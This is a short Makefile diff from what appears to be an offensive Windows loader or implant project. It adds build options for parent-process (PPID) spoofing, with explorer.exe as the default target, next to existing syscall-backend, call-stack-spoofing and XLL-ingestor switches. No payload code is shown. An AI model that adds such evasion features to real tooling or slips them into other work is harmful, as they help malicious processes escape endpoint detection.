@@ -138,6 +138,8 @@ OBJS := $(patsubst %.cpp,%.o,$(patsubst %.c,%.o,$(SRCS)))
 CONFIG_SYSCALL_BACKEND        ?= 0
 CONFIG_CALLSTACK_SPOOF_ENABLED ?= 0
 CONFIG_XLL_FILE_INGESTOR_ENABLED ?= 0
+CONFIG_PPID_SPOOF             ?= 0
+CONFIG_PPID_SPOOF_TARGET      ?= explorer.exe
 
 ifeq ($(CONFIG_SYSCALL_BACKEND),0)
     CFLAGS   += -DCONFIG_SYSCALL_BACKEND=0
@@ -193,6 +195,9 @@ endif
 # builder.py writes include/xll_ingest_file.hpp before invoking make.
 ifeq ($(CONFIG_XLL_FILE_INGESTOR_ENABLED),1)
     CFLAGS += -DCONFIG_XLL_FILE_INGESTOR_ENABLED=1
+endif
+ifeq ($(CONFIG_PPID_SPOOF),1)
+    CFLAGS += -DCONFIG_PPID_SPOOF=1 "-DCONFIG_PPID_SPOOF_TARGET_NAME=\"$(CONFIG_PPID_SPOOF_TARGET)\""
 endif
 
 # Test sources (exclude main.cpp, use test_erebus.cpp instead)
